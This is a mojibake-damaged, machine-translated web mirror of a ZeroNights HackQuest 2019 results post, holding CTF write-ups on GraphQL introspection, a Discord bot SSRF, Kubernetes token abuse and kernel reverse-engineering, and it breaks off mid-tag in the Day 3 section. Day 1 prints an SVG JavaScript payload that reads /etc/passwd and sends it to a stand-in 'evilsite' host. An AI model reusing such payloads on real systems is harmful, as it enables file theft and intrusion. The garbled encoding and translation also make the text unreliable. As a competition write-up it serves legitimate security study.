<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ‘¨ğŸ¿â€ğŸ”¬ ğŸ¥‘ ğŸ‘©ğŸ»â€ğŸ’» ZeroNights Hackquest2019ã€‚ç»“æœä¸å†™ä½œ ğŸ˜² ğŸ¤³ ğŸ‘©â€ğŸ‘§â€ğŸ‘§</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="æœ€è¿‘ï¼Œå®šæ—¶ä¸ZeroNightsä¼šè®®åŒæœŸä¸¾è¡Œçš„ä¸€å¹´ä¸€åº¦çš„HackQuestå·²ç»ç»“æŸã€‚ ä¸å¾€å¹´ä¸€æ ·ï¼Œå‚ä¸è€…å¿…é¡»è§£å†³7ä¸ªä¸åŒçš„ä»»åŠ¡-ä¸€é¡¹ä»»åŠ¡æ˜¯ä¸€å¤©çš„ä»»åŠ¡ã€‚ ä¸€å¦‚æ—¢å¾€ï¼Œä½œä¸šæœ‰åŠ©äºæˆ‘ä»¬çš„ç¤¾åŒºåˆä½œä¼™ä¼´åšå¥½å‡†å¤‡ã€‚ æ‚¨å¯ä»¥äº†è§£å¦‚ä½•è§£å†³ä»»åŠ¡ï¼Œä»¥åŠè¿™æ¬¡æ˜¯è°æˆä¸ºäº†hackquestçš„èµ¢å®¶ã€‚ 


 ç¬¬ä¸€å¤©ã€‚ 
 ä¼˜èƒœè€…...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ZeroNights Hackquest2019ã€‚ç»“æœä¸å†™ä½œ</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472416/"><p>æœ€è¿‘ï¼Œå®šæ—¶ä¸ZeroNightsä¼šè®®åŒæœŸä¸¾è¡Œçš„ä¸€å¹´ä¸€åº¦çš„HackQuestå·²ç»ç»“æŸã€‚ ä¸å¾€å¹´ä¸€æ ·ï¼Œå‚ä¸è€…å¿…é¡»è§£å†³7ä¸ªä¸åŒçš„ä»»åŠ¡-ä¸€é¡¹ä»»åŠ¡æ˜¯ä¸€å¤©çš„ä»»åŠ¡ã€‚ ä¸€å¦‚æ—¢å¾€ï¼Œä½œä¸šæœ‰åŠ©äºæˆ‘ä»¬çš„ç¤¾åŒºåˆä½œä¼™ä¼´åšå¥½å‡†å¤‡ã€‚ æ‚¨å¯ä»¥äº†è§£å¦‚ä½•è§£å†³ä»»åŠ¡ï¼Œä»¥åŠè¿™æ¬¡æ˜¯è°æˆä¸ºäº†hackquestçš„èµ¢å®¶ã€‚ </p><br><img src="https://habrastorage.org/webt/fg/tn/kk/fgtnkkl6yedcvzkmsnb_koppplo.jpeg" alt="å›¾ç‰‡"><br><a name="habracut"></a><br><h2> ç¬¬ä¸€å¤©ã€‚ </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center"> ä¼˜èƒœè€… </td></tr><tr><td align="center">  <b>ç¬¬ä¸€å</b> </td><td align="center">  <b>ç¬¬äºŒå</b> </td></tr><tr><td align="center"> å¼—æ‹‰å¾·ç»´æ–¯ </td><td align="center">  Godaswag </td></tr></tbody></table></div><br><p> ä»Šå¹´çš„ç¬¬ä¸€ä»½å·¥ä½œæ˜¯ç”±<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ•°å­—å®‰å…¨</a>å®¡æ ¸å°ç»„å‡†å¤‡çš„ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå‚ä¸è€…å¿…é¡»ç»å†ä¸‰ä¸ªé˜¶æ®µï¼šè®¿é—®æ¸¸æˆé—¨æˆ·çš„å†…éƒ¨èŠå¤©å†…å®¹ï¼Œåˆ©ç”¨Discord botä¸­çš„æ¼æ´ï¼Œä»¥åŠåœ¨Kubernetesé›†ç¾¤ä¸­ä½¿ç”¨é”™è¯¯çš„æƒé™è®¾ç½®ã€‚ </p><br><div class="spoiler">  <b class="spoiler_title">ç¬¬ä¸€å¤©ä»»åŠ¡çš„å†³å®šï¼ˆvladvisï¼‰</b> <div class="spoiler_text"><h2> ç¬¬ä¸€æ­¥ï¼šgraphql </h2><br><ul><li> æœ€åˆï¼Œæˆ‘ä»¬è¿›å…¥å…·æœ‰jså®¢æˆ·ç«¯æ¸¸æˆå’Œè¯„åˆ†çš„Webåº”ç”¨ç¨‹åºã€‚ <br><img src="https://habrastorage.org/getpro/habr/post_images/9cf/5f7/9b1/9cf5f79b1b46572ab7a9672cd2aab2b1.png"></li><li> é™¤é™æ€å¤–ï¼Œä»…å‘åç«¯å‘å‡º1ä¸ªè¯·æ±‚ï¼š <br><img src="https://habrastorage.org/getpro/habr/post_images/751/d40/d27/751d40d27d15215ce845b84c9a9a9c06.png"></li><li> æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŸ¥è¯¢è·å–æ‰€æœ‰ç±»å‹åŠå…¶å­—æ®µçš„åˆ—è¡¨ï¼š <br><pre><code class="plaintext hljs">{ __schema { types { name fields { name } } } }</code> </pre> </li><li> æˆ‘ä»¬å°†çœ‹åˆ°æ³¨é‡Šå­—æ®µï¼Œåœ¨åˆå§‹è¯·æ±‚ä¸­å¯¹å…¶è¿›è¡Œè¯·æ±‚ï¼Œå¹¶è·å¾—æŒ‡å‘ä¸‹ä¸€æ­¥çš„é“¾æ¥ã€‚ </li></ul><br><h2> ç¬¬äºŒæ­¥ï¼šDiscordæœºå™¨äºº </h2><br><ul><li> æœºå™¨äººåœ¨æœåŠ¡å™¨ä¸Šé‡åˆ°æˆ‘ä»¬å¹¶ä¸ºæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„æ¸ é“ <br><img src="https://habrastorage.org/getpro/habr/post_images/956/219/d71/956219d717f189f25cc3a61c749a8c18.png"></li><li> éšå³ï¼Œæˆ‘ä»¬åœ¨giteaä¸­çœ‹åˆ°äº†SSRFçš„æç¤ºï¼Œä½†æˆ‘ä»æœªæƒ³åˆ°è¿‡=ï¼ˆ </li><li> æˆ‘ä»¬å°è¯•è¯»å–æœ¬åœ°æ–‡ä»¶ï¼š <br><pre> <code class="plaintext hljs">&lt;svg width="10cm" height="3cm" viewBox="0 0 1000 300" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"&gt; &lt;script type="text/javascript"&gt; for (var i=0; trefs[i]; i++) { var xhr = new XMLHttpRequest(); xhr.open("GET","/etc/passwd",false); xhr.send(""); var xhr2 = new XMLHttpRequest(); xhr2.open("GET", "http://evilsite/?p="+btoa(xhr.responseText),false); xhr2.send(""); } &lt;/script&gt; &lt;/svg&gt;</code> </pre> </li><li> æˆ‘ä»¬å¾—åˆ°/ etc / passwdå¹¶çœ‹åˆ°2ä¸ªç”¨æˆ·ï¼šworkerï¼Œä»£è¡¨svgå’Œgiteaå‘ˆç° <br><pre> <code class="plaintext hljs">worker:x:1000:1000::/home/worker:/bin/sh gitea:x:1001:1001::/home/gitea:/bin/sh</code> </pre> </li><li> è¿™ä¸€æ­¥æˆ‘ç»å†äº†ä¸€æ¡æ„å¤–çš„è·¯å¾„ï¼šåœ¨.bash_historyä¸­ï¼Œå·¥ä½œç¨‹åºå…·æœ‰æŒ‡å‘sshå¯†é’¥çš„è·¯å¾„ä»¥åŠåˆ°ä¸‹ä¸€é˜¶æ®µçš„æœåŠ¡å™¨åœ°å€ã€‚ <br><pre> <code class="plaintext hljs">cd nano .ssh/connect_info echo &gt; .bash_history exit cd cd .ssh/ chmod 755 id_rsa ls -al cat id_rsa exit</code> </pre> <br><h2> ç¬¬ä¸‰æ­¥ï¼škubernetes </h2></li><li> çœ‹æ¥æˆ‘å…ˆè¿›å…¥äº†è¿™ä¸ªé˜¶æ®µã€‚  .bash_historyå’Œpsä¸ºç©ºï¼Œå› æ­¤æˆ‘å¾—å‡ºç»“è®ºï¼Œå¯¹äºæ¯ä¸ªIPï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªéš”ç¦»çš„ç¯å¢ƒ <br><img src="https://habrastorage.org/getpro/habr/post_images/225/584/a43/225584a43fca0887057424b64a1ee1b4.jpg"></li><li> åœ¨mountä¸­æ‰¾åˆ°äº†kubernetesçš„ä»¤ç‰Œ <br><img src="https://habrastorage.org/getpro/habr/post_images/4d5/d0b/87e/4d5d0b87ed9b52c107a3d536cfb07f08.png"></li><li> æœ€åˆä¸æ¸…æ¥šåœ¨å“ªé‡Œè·å¾—ä»¤ç‰Œï¼Œç„¶åæˆ‘å¼€å§‹æ‰«æç½‘æ ¼...ç„¶ååœ¨æŸä¸ªæ—¶å€™ï¼Œæˆ‘å¼€å§‹èµ°è¿›äº‘ä¸­çš„é‚»å±… </li><li> æ­¤åï¼Œå‘å‡ºäº†è¦æ‰«æçš„å­ç½‘çš„æç¤ºï¼Œå¹¶ä¸”å‡ ä¹ç«‹å³å‘ç°äº†å…¶ä½™çš„api kubernetesã€‚ </li><li> åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œæˆ‘æ„è¯†åˆ°æˆ‘å¹¶ä¸å­¤å•åœ¨æœåŠ¡å™¨ä¸Šï¼Œä¹Ÿä¸æƒ³å‰Šå‡æŸäº›ä¸œè¥¿ï¼Œä¾‹å¦‚é®ç½©cmdlineï¼Œæ‰€ä»¥æˆ‘å†³å®šè¿™æ ·åš <del> æ›´å®¹æ˜“ </del> è¿™æ˜¯æ›´ç—›è‹¦çš„ï¼Œå¹¶é€šè¿‡sshè½¬å‘ç»™è‡ªå·±çš„è¢œå­ä»£ç† </li><li> ä½¿ç”¨<code>kubectl get pods</code> ï¼Œ <code>kubectl get pods</code>äº†ä¸€ä¸ªå®¹å™¨åˆ—è¡¨ï¼Œå¹¶ä¸”<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">kubernetesæ–‡æ¡£</a>å»ºè®®execå¯ä»¥ä½¿ç”¨ä¸<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">docker</a>ç›¸åŒçš„è¯­æ³• </li><li> ç„¶åï¼Œè¢œå­ä»£ç†é­å—äº†1.5ä¸ªå°æ—¶çš„è‹¦éš¾ï¼Œé«˜ç®¡çš„websocketå´æ²¡æœ‰ä¸Šå‡ã€‚ æˆ‘æœ€ç»ˆé€šè¿‡sshç›´æ¥å»äº†kubectl <br><img src="https://habrastorage.org/getpro/habr/post_images/f49/096/be8/f49096be8b3c769802f612325f70e7ba.png"></li><li> ç¬¬äºŒä¸ªå®¹å™¨å…·æœ‰ä¸€ä¸ªæ–°ä»¤ç‰Œï¼Œå¹¶ä¸”å®ƒå·²ç»å¯ä»¥è®¿é—®ç›¸é‚»å‘½åç©ºé—´zn2ä¸­çš„ç¾¤é›†ï¼ˆæœ€åˆæˆ‘ä»¬åœ¨å‘½åç©ºé—´zn1ä¸­ï¼‰ï¼Œä»ä¸­å¯ä»¥çœ‹åˆ°redis </li><li> æˆ‘ä»¬å›æƒ³èµ·è¿‡å»Zeronightsçš„<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æŠ¥å‘Š</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">@paulaxe</a> ï¼Œå¹¶ä½¿ç”¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ­¤PoC</a>è·å¾—äº†RCEï¼Œä¾‹å¦‚ </li><li> æ”¶åˆ°ä¸‹ä¸€ä¸ªä»¤ç‰Œåï¼Œæ‚¨å¯ä»¥ä»kubernetesæœºå¯†ä¸­æå–è¯¥æ ‡å¿— <br><img src="https://habrastorage.org/getpro/habr/post_images/71e/49d/172/71e49d172f647b8311233e5646dd9170.png"></li></ul></div></div><br><h2> ç¬¬2å¤©ã€‚MICOSOFTLUNIX </h2><br><div class="scrollable-table"><table><tbody><tr><td colspan="3" align="center"> ä¼˜èƒœè€… </td></tr><tr><td align="center">  <b>ç¬¬ä¸€å</b> </td><td align="center">  <b>ç¬¬äºŒå</b> </td><td align="center">  <b>ç¬¬ä¸‰å</b> </td></tr><tr><td align="center"> æ’•è£‚ </td><td align="center"> ç½ª__ </td><td align="center">  AV1ct0r </td></tr><tr><td colspan="3" align="center"> è¿˜å†³å®šï¼šdemidov_alï¼Œgotdaswagï¼Œmedidrdriderï¼Œgroke_is_love_groke_is_life </td></tr></tbody></table></div><br><p> ç¬¬äºŒå¤©çš„ä»»åŠ¡æ˜¯ç”±<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">r0 Crew</a>ç¤¾åŒºçš„æˆå‘˜å‡†å¤‡çš„ã€‚ è¦è§£å†³æ­¤é—®é¢˜ï¼Œæ‚¨éœ€è¦ä¸ºå†…æ ¸å·²ä¿®æ”¹çš„Linuxæ˜ åƒç”Ÿæˆæ¿€æ´»å¯†é’¥ã€‚ </p><br><div class="spoiler">  <b class="spoiler_title">ç¬¬äºŒå¤©ä»»åŠ¡çš„å†³å®šï¼ˆæ’•æ¯ï¼‰</b> <div class="spoiler_text"><p> ç»™å®šï¼š <code>jD74nd8_task2.iso</code>æ–‡ä»¶ï¼Œå¯å¯åŠ¨ISOæ˜ åƒã€‚ ä»æ˜ åƒä¸­çš„æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‡å®šå®ƒæ˜¯Linuxï¼šæœ‰ä¸€ä¸ªå†…æ ¸<code>boot/kernel.xz</code> ï¼Œä¸€ä¸ªåˆå§‹ramdisk <code>boot/rootfs.xz</code>å’Œä¸€ä¸ªboot loader <code>boot/syslinux/</code> <code>boot/rootfs.xz</code> <code>boot/syslinux/</code> ã€‚ </p><br><p> æˆ‘ä»¬æ­£åœ¨å°è¯•è§£å‹ç¼©æ ¸å¿ƒå’Œè™šæ‹Ÿç£ç›˜ã€‚  Ramdiskæ˜¯ç”±xzå‹ç¼©çš„å¸¸è§„cpioå½’æ¡£æ–‡ä»¶ã€‚ ä½¿ç”¨è„šæœ¬<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a>è§£å‹ç¼©å†…æ ¸ã€‚ æ‚¨è¿˜å¯ä»¥æ³¨æ„å†…æ ¸ä¿¡æ¯ï¼š </p><br><pre> <code class="plaintext hljs">&gt; file kernel.xz kernel.xz: Linux kernel x86 boot executable bzImage, version 5.0.11 (billy@micosoft.com) #1 SMP Sat Aug 25 13:37:00 CEST 2019, RO-rootFS, swap_dev 0x2, Normal VGA</code> </pre> <br><p> åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬åœ¨isoæ˜ åƒä¸­å‘ç°äº†<code>minimal/rootfs/bin/activator</code>çš„ä¸»è¦ä»»åŠ¡ï¼šä¸€åˆ‡å½’ç»“ä¸ºå°†è¾“å…¥çš„ç”µå­é‚®ä»¶æ•°æ®å’Œæ¿€æ´»å¯†é’¥ä»¥<code>$email|$key</code>æ ¼å¼å†™å…¥è®¾å¤‡<code>/dev/activate</code> ã€‚ å¦‚æœæˆåŠŸè¿›è¡Œäº†å¯†é’¥æ£€æŸ¥ï¼Œåˆ™ä»<code>/dev/activate</code>è¯»å–å°†äº§ç”Ÿ<code>ACTIVATED</code>è¡Œï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¿€æ´»å™¨å°†å¼€å§‹æ¸¸æˆ2048ã€‚ </p><br><p> ç°åœ¨è¯¥æ¥çœ‹ä¸€ä¸‹åŠ¨æ€ä»»åŠ¡äº†ã€‚ ä¸ºæ­¤ï¼Œè¯·åœ¨KVMä¸­è¿è¡Œä»¿çœŸå™¨ï¼š </p><br><pre> <code class="plaintext hljs">&gt; qemu-system-x86_64 -enable-kvm -drive format=raw,media=cdrom,readonly,file=jD74nd8_task2.iso</code> </pre> <br><p>  Linuxå¯åŠ¨å¹¶ç«‹å³ä»è¦†ç›–å¯åŠ¨<code>/bin/activator</code> ã€‚ è¿™æ˜¯åœ¨<code>/etc/inittab</code>é˜æ˜çš„ã€‚ ä¸ºäº†é¿å…é•¿æ—¶é—´æ·±å…¥äºŒè¿›åˆ¶æ¸¸æˆï¼Œæˆ‘æƒ³è·å–ä¸€ä¸ªshellå¹¶è‡³å°‘æŸ¥çœ‹<code>/proc</code>å’Œ<code>/sys</code> ã€‚ å¯¹æˆ‘è€Œè¨€ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯å°†isoæ–‡ä»¶ç®€å•åœ°ä¸Šä¼ åˆ°æ¿€æ´»ç¨‹åºè„šæœ¬æœ¬èº«æ‰€åœ¨çš„ä½ç½®ã€‚ ä»£æ›¿<code>sleep 1</code> set <code>/bin/sh</code> ï¼Œå³ æ¯æ¬¡å°è¯•è¾“å…¥åºåˆ—å·åï¼Œæˆ‘éƒ½ä¼šæ”¶åˆ°ä¸€ä¸ªå¤–å£³ã€‚ </p><br><p> æ‰€ä»¥æœ‰ä¸€ä¸ªå¤–å£³ï¼šæˆ‘ä»¬çœ‹èµ·æ¥<code>/proc/kallsyms</code>ä¸å­˜åœ¨ï¼Œå³ ç¼ºå°‘å†…æ ¸å­—ç¬¦ã€‚ å½“ç„¶ï¼Œæœ‰äº†å®ƒä»¬ï¼Œé€Ÿåº¦ä¼šå¿«å¾—å¤šï¼Œä½†æ˜¯æ²¡å…³ç³»ã€‚ æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾æœ‰å…³device <code>/dev/activator</code> ï¼š </p><br><pre> <code class="plaintext hljs">/ # ls -la /dev/activate crw------- 1 0 0 252, 0 Oct 15 08:57 /dev/activate / # cat /proc/devices Character devices: ... 252 activate ... Block devices: ...</code> </pre> <br><p> ä»<code>/proc/devices</code>çš„ä¿¡æ¯å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯å…·æœ‰ä¸»è¦ç‰ˆæœ¬252å’Œæ¬¡è¦0çš„charè®¾å¤‡ã€‚ </p><br><p> ç°åœ¨æ˜¯æ—¶å€™åœ¨å†…æ ¸äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°è¯¥è®¾å¤‡çš„æ³¨å†ŒåŠŸèƒ½ï¼Œä»¥æŸ¥æ‰¾å…¶<code>write</code>æ“ä½œçš„å¤„ç†ç¨‹åºäº†ã€‚ ä¸ºæ­¤ï¼Œæ‰¾åˆ°å¯¹å­—ç¬¦ä¸²<code>activate</code>äº¤å‰å¼•ç”¨ã€‚ ä½†æ˜¯å†…æ ¸ä¸­æ²¡æœ‰è¿™æ ·çš„ä»£ç è¡Œï¼Œå¯èƒ½æ˜¯æŸç§ç¨‹åº¦ä¸Šè¢«éšè—äº†ã€‚ </p><br><p> åœ¨ä¸‹ä¸€ä¸ªå°è¯•ä¸­ï¼Œæˆ‘ä»¬å°è¯•æ‰¾åˆ°è´Ÿè´£æ³¨å†Œå­—ç¬¦è®¾å¤‡çš„å‡½æ•°ï¼š <code>cdev_add</code>å’Œ<code>register_chrdev</code> ã€‚ å¯ä»¥é€šè¿‡äº¤å‰å¼•ç”¨<code>/dev/console</code>æˆ–ä»»ä½•å…¶ä»–å­—ç¬¦è®¾å¤‡å¹¶è·å–å†…æ ¸æºä»£ç æ¥å®Œæˆï¼ˆæˆ‘ä½¿ç”¨çš„ç‰ˆæœ¬æ˜¯5.0.11ï¼Œä½†ä¸ç¡®å®šè¯¥ç‰ˆæœ¬æ˜¯å¦æ­£ç¡®ï¼‰ã€‚ æŸ¥çœ‹äº†æ­£åœ¨æ³¨å†Œçš„è®¾å¤‡çš„åˆ—è¡¨ä¹‹åï¼Œæˆ‘ä»¬æ²¡æœ‰æ‰¾åˆ°å…·æœ‰ä¸»ç‰ˆæœ¬252çš„è®¾å¤‡ï¼Œè¿™ä¸¤ä¸ªåŠŸèƒ½å¾ˆå¯èƒ½æ²¡æœ‰æ³¨å†Œã€‚ </p><br><p> è®©æˆ‘ä»¬å°è¯•å¯»æ‰¾åŠ¨æ€æ–¹é¢çš„å…¶ä»–çº¿ç´¢ï¼š </p><br><pre> <code class="plaintext hljs">/ # ls -la /sys/dev/char/252:0 lrwxrwxrwx 1 0 0 0 Oct 15 09:00 /sys/dev/char/252:0 -&gt; ../../devices/virtual/EEy????I/activate</code> </pre> <br><p> è¿™æ˜¯è¦<code>EEy????I</code>çš„<code>EEy????I</code>è®¾å¤‡<code>EEy????I</code> æˆ‘ä»¬å°è¯•åœ¨äºŒè¿›åˆ¶ä¸­æ‰¾åˆ°è¿™æ¡çº¿ï¼Œå®ƒåœ¨é‚£é‡Œï¼ </p><br><p><img src="https://habrastorage.org/webt/ww/2x/pa/ww2xpaeiblwxlyive4ytkkdp4iq.png"></p><br><p> å°½ç®¡æœªæ‰¾åˆ°å¯¹å®ƒçš„äº¤å‰å¼•ç”¨ï¼Œä½†åœ¨å®ƒæ—è¾¹æ˜¯ç±»ä¼¼äºå­—ç¬¦ä¸²çš„å¯è§æ•°æ®ã€‚ å¦‚æœæŸ¥çœ‹ä½¿ç”¨å®ƒä»¬çš„ä»£ç ï¼Œåˆ™å¯ä»¥çœ‹åˆ°å®ƒä»¬æ˜¯<code>activate</code>è®¾å¤‡æ‰€éœ€çš„è¯»å†™å¤„ç†ç¨‹åºï¼Œå¹¶é€šè¿‡ç®€å•çš„XORè¿›è¡Œäº†åŠ å¯†ã€‚ </p><br><p> è¯»å–å¤„ç†åŠŸèƒ½ï¼š </p><br><p><img src="https://habrastorage.org/webt/wr/gj/le/wrgjlelw6zor474zwwy2eins8zw.png"></p><br><p> å¤„ç†å†™æ“ä½œçš„åŠŸèƒ½ï¼Œå®ƒä¹Ÿæ˜¯è®¸å¯è¯æ£€æŸ¥ï¼š </p><br><p><img src="https://habrastorage.org/webt/go/sh/vm/goshvmqukonyiv69nltp_g9xrlw.png"></p><br><p> å¿«é€Ÿæ£€æŸ¥æ¿€æ´»éªŒè¯ç è¡¨æ˜ï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯åœ¨åœ°å€<code>0xFFFFFFFF811F094B</code>å¤„æ”¾ç½®ä¸€ä¸ªæ–­ç‚¹ï¼Œç„¶ååœ¨æ­¤å¤„æå–æ¿€æ´»ç ï¼Œè€Œæ— éœ€çœŸæ­£ç ”ç©¶é‚£é‡Œå‘ç”Ÿçš„äº‹æƒ…ã€‚ ä¸ºæ­¤ï¼Œè¯·ä½¿ç”¨<code>-s</code>æ ‡å¿—è¿è¡Œqemuã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œqemuè¿è¡Œgdbå­˜æ ¹ï¼Œè¿™ä½¿æ‚¨å¯ä»¥ä½¿ç”¨ä»»ä½•gdbå®¢æˆ·ç«¯ã€‚ å¦‚æœæ‚¨å…·æœ‰è®¸å¯è¯ï¼Œåˆ™åœ¨IDA Proä¸­æœ€ç®€å•ï¼Œæœ€å¿«çš„æ–¹æ³•ã€‚ ä½†æ˜¯æ²¡æœ‰äººç¦æ­¢åœ¨æ§åˆ¶å°gdbä¸­åšæ‰€æœ‰äº‹æƒ…ã€‚ </p><br><p> æˆ‘ä»¬æŒ‰ç…§å®˜æ–¹<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ•™ç¨‹ä¸­çš„è¯´æ˜è¿›è¡Œæ‰€æœ‰æ“ä½œ</a> ã€‚ ç°åœ¨ï¼Œæ‚¨éœ€è¦åœ¨å·²ç»è¿è¡Œçš„å†…æ ¸ä¸­æ‰¾åˆ°å¤„ç†åŠŸèƒ½ã€‚ </p><br><p><img src="https://habrastorage.org/webt/ql/cc/f1/qlccf1qgfqvp3mimbbuyazih4de.png"></p><br><p><img src="https://habrastorage.org/webt/jh/ui/br/jhuibrua89zngguxpedg0oco8h8.png"></p><br><p> ç”±äºå†…æ ¸æ˜¯ä½¿ç”¨KASLRæ”¯æŒæ„å»ºçš„ï¼Œå› æ­¤æ­£åœ¨è¿è¡Œçš„å†…æ ¸çš„åœ°å€å°†ç§»è‡³æ¯æ¬¡å†…æ ¸å¯åŠ¨æ—¶éƒ½ä¼šç”Ÿæˆçš„éšæœºåç§»é‡ã€‚ æˆ‘ä»¬è®¡ç®—è¯¥åç§»é‡ï¼ˆæˆ‘ä»¬åœ¨è°ƒè¯•å†…æ ¸çš„ä»£ç ä¸­è·å–å”¯ä¸€å­—èŠ‚åºåˆ—çš„åœ°å€ï¼Œç„¶åä»äºŒè¿›åˆ¶ä¸­å‡å»è¯¥åºåˆ—çš„åœ°å€ï¼‰ï¼Œç„¶åå°†æ¿€æ´»å‡½æ•°æ·»åŠ åˆ°è¯¥åœ°å€ï¼Œç„¶ååœ¨å†…å­˜ä¸­æ‰¾åˆ°å®ƒã€‚ ä¸€åˆ‡ï¼Œç°åœ¨å–å†³äºè§„æ¨¡ã€‚ è®¾ç½®ä¸€ä¸ªæ–­ç‚¹å¹¶è·å–ä»£ç ã€‚ </p><br><p><img src="https://habrastorage.org/webt/ef/yp/vg/efypvgwh0kyc2zi999ucriitvt8.png"></p><br><p><img src="https://habrastorage.org/webt/nt/ny/wa/ntnywaix5hh2hptggey0gk9a8fi.png"></p><br><p><img src="https://habrastorage.org/webt/q4/4c/tm/q44ctmpm3uzgmm_9tigzw9us4a0.png"></p></div></div><br><p> å‚ä¸è€…ä¹‹ä¸€å·²ç»åœ¨ä¸­å¿ƒå‘å¸ƒäº†æ­¤ä»»åŠ¡çš„è§£å†³æ–¹æ¡ˆã€‚ æ‚¨å¯ä»¥<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åœ¨è¿™é‡Œ</a>ç†Ÿæ‚‰å®ƒã€‚ </p><br><h2> ç¬¬3å¤©ã€‚ </h2><br><div class="scrollable-table"><table><tbody><tr><td align="center"> ä¼˜èƒœè€… </td></tr><tr><td align="center">  <b>ç¬¬ä¸€å</b> </td></tr><tr><td align="center"> é»‘é£æ‰‡ </td></tr></tbody></table></div><br><p> é€šè¿‡bechedï¼ˆ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">DeteAct</a> ï¼‰å‡†å¤‡çš„ä½œä¸šã€‚ ä¸å¹³å‡¡çš„ä»˜æ¬¾é¡µé¢å‘ä¸ä¼šäººå‘˜è¡¨ç¤ºæ¬¢è¿ã€‚ å¯¹äºè¯¥è§£å†³æ–¹æ¡ˆï¼Œå¿…é¡»ä½¿ç”¨phpå‡½æ•°<code>file_get_contents</code>çš„åŠŸèƒ½è®¿é—®Clickhouseæ•°æ®åº“ã€‚ </p><br><div class="spoiler">  <b class="spoiler_title">ç¬¬ä¸‰å¤©ä»»åŠ¡çš„å†³å®šï¼ˆblackfanï¼‰</b> <div class="spoiler_text"><p> ä»»åŠ¡æ˜¯ä»˜æ¬¾é¡µé¢ï¼Œå…¶ä¸­å”¯ä¸€æœ‰è¶£çš„å‚æ•°æ˜¯callback_urlã€‚ </p><br><p><img src="https://habrastorage.org/getpro/habr/post_images/c6c/428/f02/c6c428f02a3ea33075cbe0d5d556ace8.png" alt="https://i.imgur.com/iX65TI3.png"></p><br><p> æˆ‘ä»¬æŒ‡å‡ºæ‚¨çš„ç½‘ç«™å¹¶æ•è·è¯·æ±‚ï¼š </p><br><pre> <code class="plaintext 